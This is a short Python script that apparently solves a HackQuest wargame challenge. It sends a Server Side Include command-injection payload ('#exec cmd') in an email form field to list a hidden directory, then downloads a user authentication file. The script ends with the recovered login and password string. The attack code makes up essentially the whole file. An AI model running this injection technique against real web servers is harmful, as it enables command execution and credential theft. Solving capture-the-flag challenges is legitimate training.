import sys
from lxml import etree
from urllib import urlencode
sys.path.append('..')
from fetch_web import fetch_web

def main():
    data = urlencode({
        'emailaddress':'<!--#exec cmd="ls ../images__"-->',
    })
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/118116/118116.php', data)
    root = etree.fromstring(result, etree.HTMLParser())
    url = root.xpath('//a')[0].attrib['href']
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/118116/' + url)
    open('result.html', 'w').write(result)
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/118116/images__/userauthinfo0205.txt')
    open('userauthinfo0205.txt', 'w').write(result)

if __name__ == '__main__':
    main()

'templogin:nkBHv'
